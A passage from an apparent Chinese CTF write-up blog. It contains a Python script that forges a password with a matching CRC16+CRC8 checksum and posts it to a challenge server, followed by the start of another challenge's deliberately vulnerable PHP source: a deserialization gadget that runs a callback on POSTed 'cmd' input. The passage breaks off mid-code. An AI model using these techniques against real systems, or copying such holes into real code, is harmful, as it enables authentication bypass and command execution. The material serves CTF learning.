----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc16</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    checksum = <span class="number">0xFFFF</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        checksum ^= b</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> checksum &amp; <span class="number">1</span>:</span><br><span class="line">                checksum = ((checksum &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xA001</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                checksum &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> checksum &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">crc8_table = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x1C</span>, <span class="number">0x1B</span>, <span class="number">0x12</span>, <span class="number">0x15</span>, <span class="number">0x38</span>, <span class="number">0x3F</span>, <span class="number">0x36</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x23</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x79</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x4F</span>, <span class="number">0x46</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>,</span><br><span class="line">    <span class="number">0xE0</span>, <span class="number">0xE7</span>, <span class="number">0xEE</span>, <span class="number">0xE9</span>, <span class="number">0xFC</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, <span class="number">0xF5</span>, <span class="number">0xD8</span>, <span class="number">0xDF</span>, <span class="number">0xD6</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0xC3</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>,</span><br><span class="line">    <span class="number">0x90</span>, <span class="number">0x97</span>, <span class="number">0x9E</span>, <span class="number">0x99</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x82</span>, <span class="number">0x85</span>, <span class="number">0xA8</span>, <span class="number">0xAF</span>, <span class="number">0xA6</span>, <span class="number">0xA1</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>,</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xC0</span>, <span class="number">0xC9</span>, <span class="number">0xCE</span>, <span class="number">0xDB</span>, <span class="number">0xDC</span>, <span class="number">0xD5</span>, <span class="number">0xD2</span>, <span class="number">0xFF</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0xE4</span>, <span class="number">0xED</span>, <span class="number">0xEA</span>,</span><br><span class="line">    <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xB9</span>, <span class="number">0xBE</span>, <span class="number">0xAB</span>, <span class="number">0xAC</span>, <span class="number">0xA5</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0x88</span>, <span class="number">0x81</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>,</span><br><span class="line">    <span class="number">0x27</span>, <span class="number">0x20</span>, <span class="number">0x29</span>, <span class="number">0x2E</span>, <span class="number">0x3B</span>, <span class="number">0x3C</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x1F</span>, <span class="number">0x18</span>, <span class="number">0x11</span>, <span class="number">0x16</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>, <span class="number">0x0A</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x50</span>, <span class="number">0x59</span>, <span class="number">0x5E</span>, <span class="number">0x4B</span>, <span class="number">0x4C</span>, <span class="number">0x45</span>, <span class="number">0x42</span>, <span class="number">0x6F</span>, <span class="number">0x68</span>, <span class="number">0x61</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x7D</span>, <span class="number">0x7A</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x8E</span>, <span class="number">0x87</span>, <span class="number">0x80</span>, <span class="number">0x95</span>, <span class="number">0x92</span>, <span class="number">0x9B</span>, <span class="number">0x9C</span>, <span class="number">0xB1</span>, <span class="number">0xB6</span>, <span class="number">0xBF</span>, <span class="number">0xB8</span>, <span class="number">0xAD</span>, <span class="number">0xAA</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0xFE</span>, <span class="number">0xF7</span>, <span class="number">0xF0</span>, <span class="number">0xE5</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>, <span class="number">0xC1</span>, <span class="number">0xC6</span>, <span class="number">0xCF</span>, <span class="number">0xC8</span>, <span class="number">0xDD</span>, <span class="number">0xDA</span>, <span class="number">0xD3</span>, <span class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0x7B</span>, <span class="number">0x7C</span>, <span class="number">0x51</span>, <span class="number">0x56</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x4D</span>, <span class="number">0x4A</span>, <span class="number">0x43</span>, <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x17</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x21</span>, <span class="number">0x26</span>, <span class="number">0x2F</span>, <span class="number">0x28</span>, <span class="number">0x3D</span>, <span class="number">0x3A</span>, <span class="number">0x33</span>, <span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x4E</span>, <span class="number">0x49</span>, <span class="number">0x40</span>, <span class="number">0x47</span>, <span class="number">0x52</span>, <span class="number">0x55</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x76</span>, <span class="number">0x71</span>, <span class="number">0x78</span>, <span class="number">0x7F</span>, <span class="number">0x6A</span>, <span class="number">0x6D</span>, <span class="number">0x64</span>, <span class="number">0x63</span>,</span><br><span class="line">    <span class="number">0x3E</span>, <span class="number">0x39</span>, <span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x14</span>, <span class="number">0x13</span>,</span><br><span class="line">    <span class="number">0xAE</span>, <span class="number">0xA9</span>, <span class="number">0xA0</span>, <span class="number">0xA7</span>, <span class="number">0xB2</span>, <span class="number">0xB5</span>, <span class="number">0xBC</span>, <span class="number">0xBB</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0x98</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0x8D</span>, <span class="number">0x84</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0xDE</span>, <span class="number">0xD9</span>, <span class="number">0xD0</span>, <span class="number">0xD7</span>, <span class="number">0xC2</span>, <span class="number">0xC5</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>, <span class="number">0xE6</span>, <span class="number">0xE1</span>, <span class="number">0xE8</span>, <span class="number">0xEF</span>, <span class="number">0xFA</span>, <span class="number">0xFD</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc8</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    crc = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc = crc8_table[(crc ^ b) &amp; <span class="number">0xff</span>]</span><br><span class="line">    <span class="keyword">return</span> crc &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc24</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> (compute_crc16(data) &lt;&lt; <span class="number">8</span>) | compute_crc8(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---- GF(2) basis solver to express target diff as XOR of columns ----</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_columns_for_positions</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    For each (position, bit) produce a 24-bit column representing effect on crc24 when toggling that bit.</span></span><br><span class="line"><span class="string">    The order is for each position in positions (in order) and for bit 0..7 within each position.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    columns = []</span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> positions:</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            b = <span class="built_in">bytearray</span>(base)</span><br><span class="line">            b[pos] ^= (<span class="number">1</span> &lt;&lt; bit)</span><br><span class="line">            eff = crc24(<span class="built_in">bytes</span>(b)) ^ crc24(base)</span><br><span class="line">            columns.append(eff)</span><br><span class="line">    <span class="keyword">return</span> columns</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_solve_with_columns</span>(<span class="params">columns: <span class="type">List</span>[<span class="built_in">int</span>], target_diff: <span class="built_in">int</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given columns (list of 24-bit ints) and target_diff (24-bit int),</span></span><br><span class="line"><span class="string">    try to represent target_diff as XOR of some columns.</span></span><br><span class="line"><span class="string">    If possible, return an integer mask where bit j means use columns[j].</span></span><br><span class="line"><span class="string">    Otherwise return None.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># basis indexed by bit position 0..23 (we&#x27;ll store highest-bit-first reduction)</span></span><br><span class="line">    BASIS_BITS = <span class="number">24</span></span><br><span class="line">    basis = [<span class="number">0</span>] * BASIS_BITS      <span class="comment"># basis vector value for that leading bit</span></span><br><span class="line">    <span class="comment"># representation mask (which columns XOR to produce basis vector)</span></span><br><span class="line">    basis_repr = [<span class="number">0</span>] * BASIS_BITS</span><br><span class="line">    <span class="keyword">for</span> j, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(columns):</span><br><span class="line">        v = col</span><br><span class="line">        repr_mask = <span class="number">1</span> &lt;&lt; j</span><br><span class="line">        <span class="comment"># reduce using current basis</span></span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">            <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> basis[bit] != <span class="number">0</span>:</span><br><span class="line">                    v ^= basis[bit]</span><br><span class="line">                    repr_mask ^= basis_repr[bit]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    basis[bit] = v</span><br><span class="line">                    basis_repr[bit] = repr_mask</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># now try to reduce target_diff</span></span><br><span class="line">    v = target_diff</span><br><span class="line">    <span class="built_in">repr</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(BASIS_BITS)):</span><br><span class="line">        <span class="keyword">if</span> (v &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> basis[bit] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># cannot represent</span></span><br><span class="line">            v ^= basis[bit]</span><br><span class="line">            <span class="built_in">repr</span> ^= basis_repr[bit]</span><br><span class="line">    <span class="keyword">if</span> v == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">repr</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_candidate_from_mask</span>(<span class="params">base: <span class="built_in">bytes</span>, positions: <span class="type">List</span>[<span class="built_in">int</span>], mask: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    L = <span class="built_in">len</span>(base)</span><br><span class="line">    delta = <span class="built_in">bytearray</span>(L)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(positions) * <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (mask &gt;&gt; j) &amp; <span class="number">1</span>:</span><br><span class="line">            pos_idx = j // <span class="number">8</span></span><br><span class="line">            bit_idx = j % <span class="number">8</span></span><br><span class="line">            pos = positions[pos_idx]</span><br><span class="line">            delta[pos] ^= (<span class="number">1</span> &lt;&lt; bit_idx)</span><br><span class="line">    candidate = <span class="built_in">bytearray</span>(base)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">        candidate[i] ^= delta[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(candidate)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- High-level search routine ---</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">secret: <span class="built_in">bytes</span>, k: <span class="built_in">int</span> = <span class="number">3</span>, tries_per_positions_set: <span class="built_in">int</span> = <span class="number">1000</span>, seed: <span class="type">Optional</span>[<span class="built_in">int</span>] = <span class="literal">None</span>, position_sets: <span class="type">Optional</span>[<span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]] = <span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    secret: bytes (the true password)</span></span><br><span class="line"><span class="string">    k: number of bytes that may be toggled (choose positions set size k)</span></span><br><span class="line"><span class="string">    tries_per_positions_set: for each chosen set of positions, try this many random base messages</span></span><br><span class="line"><span class="string">    position_sets: optional explicit list of position lists to try; otherwise we try a few heuristics + random sets</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    random.seed(seed)</span><br><span class="line">    L = <span class="built_in">len</span>(secret)</span><br><span class="line">    target_crc24 = crc24(secret)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># produce default position sets if not provided</span></span><br><span class="line">    <span class="keyword">if</span> position_sets <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        pos_sets = []</span><br><span class="line">        <span class="comment"># try last k bytes, first k bytes, a middle mix</span></span><br><span class="line">        <span class="keyword">if</span> L &gt;= k:</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(L-k, L)))</span><br><span class="line">            pos_sets.append(<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">0</span>, k)))</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">        <span class="comment"># add several random sets</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            pos_sets.append(<span class="built_in">sorted</span>(random.sample(<span class="built_in">range</span>(L), k)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pos_sets = position_sets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> positions <span class="keyword">in</span> pos_sets:</span><br><span class="line">        <span class="comment"># prepare columns template for a base; columns depend on base, so must recompute per base</span></span><br><span class="line">        <span class="keyword">for</span> attempt <span class="keyword">in</span> <span class="built_in">range</span>(tries_per_positions_set):</span><br><span class="line">            <span class="comment"># pick a random base that is *not* the secret (we can also use the secret itself but that often gives trivial zero-diff)</span></span><br><span class="line">            base = <span class="built_in">bytearray</span>(secret)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(L):</span><br><span class="line">                base[i] = random.randrange(<span class="number">256</span>)</span><br><span class="line">            base = <span class="built_in">bytes</span>(base)</span><br><span class="line">            columns = build_columns_for_positions(base, positions)</span><br><span class="line">            d = crc24(base) ^ target_crc24</span><br><span class="line">            mask = try_solve_with_columns(columns, d)</span><br><span class="line">            <span class="keyword">if</span> mask <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                candidate = build_candidate_from_mask(base, positions, mask)</span><br><span class="line">                <span class="keyword">if</span> candidate != secret <span class="keyword">and</span> crc24(candidate) == target_crc24:</span><br><span class="line">                    <span class="keyword">return</span> &#123;</span><br><span class="line">                        <span class="string">&quot;secret&quot;</span>: secret,</span><br><span class="line">                        <span class="string">&quot;candidate&quot;</span>: candidate,</span><br><span class="line">                        <span class="string">&quot;positions&quot;</span>: positions,</span><br><span class="line">                        <span class="string">&quot;base&quot;</span>: base,</span><br><span class="line">                        <span class="string">&quot;mask&quot;</span>: mask</span><br><span class="line">                    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper to pretty-print bytes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">as_hex</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> b.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_printable</span>(<span class="params">b: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = b.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(<span class="number">0x20</span> &lt;= c &lt; <span class="number">0x7f</span> <span class="keyword">for</span> c <span class="keyword">in</span> b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Find a different message with same CRC16+CRC8 as secret (same length).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--secret&quot;</span>, required=<span class="literal">True</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;the secret string (exact bytes).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--k&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">3</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;number of byte positions to allow flipping (default 3).&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--tries&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">2000</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random bases to try per positions set.&quot;</span>)</span><br><span class="line">    p.add_argument(<span class="string">&quot;--seed&quot;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> s: <span class="built_in">int</span>(s, <span class="number">0</span>), default=<span class="number">0x414141</span>,</span><br><span class="line">                   <span class="built_in">help</span>=<span class="string">&quot;random seed (accepts decimal or hex, e.g. 0x414141).&quot;</span>)</span><br><span class="line">    args = p.parse_args()</span><br><span class="line"></span><br><span class="line">    secret = args.secret.encode(<span class="string">&#x27;latin1&#x27;</span>)  <span class="comment"># allow raw bytes via latin1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret:&quot;</span>, secret)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret hex:&quot;</span>, as_hex(secret))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Secret CRC16=0x%04x, CRC8=0x%02x, combined=0x%06x&quot;</span> %</span><br><span class="line">          (compute_crc16(secret), compute_crc8(secret), crc24(secret)))</span><br><span class="line">    result = find_collision(</span><br><span class="line">        secret, k=args.k, tries_per_positions_set=args.tries, seed=args.seed)</span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No collision found. Try increasing k or the number of tries, or provide specific position sets.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    cand = result[<span class="string">&quot;candidate&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Found candidate:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate bytes repr:&quot;</span>, cand)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate hex:&quot;</span>, as_hex(cand))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Candidate CRC16=0x%04x, CRC8=0x%02x&quot;</span> %</span><br><span class="line">          (compute_crc16(cand), compute_crc8(cand)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Positions used:&quot;</span>, result[<span class="string">&quot;positions&quot;</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Base used:&quot;</span>, as_hex(result[<span class="string">&quot;base&quot;</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; Printable?:&quot;</span>, is_printable(cand))</span><br><span class="line">    <span class="comment"># If printable is desired but candidate not printable, user can try different settings or try small brute force on chosen positions.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure><p><code>exp.py --secret &quot;Enj0yNSSCTF4th!&quot; --k 3 --tries 2000 --seed 0x414141</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">candidate = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;2619576310042a5bbf7c24dfa47780&quot;</span>)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://node9.anna.nssctf.cn:29070/&quot;</span>,</span><br><span class="line">                  data=&#123;<span class="string">&quot;pass&quot;</span>: candidate&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h2 id="mpgafilesystem"><a class="markdownIt-Anchor" href="#mpgafilesystem"></a> [mpga]filesystem</h2><p>题目有源码，可以直接下载</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contextName</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="string">&#x27;ApplicationContext&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;contextName = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;contextName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">property_exists</span>(<span class="variable">$this</span>, <span class="variable">$key</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;<span class="variable">$key</span>) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;callbackFunction)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;callbackFunction&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$targetFile</span> = <span class="literal">null</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;targetFile = <span class="variable">$targetFile</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterPath</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;targetFile))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;文件路径不符合规范&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">performWriteOperation</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">        </span><br><span class="line">        <span class="variable">$targetObject</span> = <span class="variable language_">$this</span>-&gt;targetFile; </span><br><span class="line">        <span class="variable">$value</span> = <span class="variable">$targetObject</span>-&gt;<span class="variable">$var</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileHash</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterPath</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;文件未找到&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$this</span>-&gt;targetFile)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$md5_hash</span> = <span class="title function_ invoke__">md5_file</span>(<span class="variable">$this</span>-&gt;targetFile);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;文件MD5哈希 (尝试): &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$md5_hash</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span 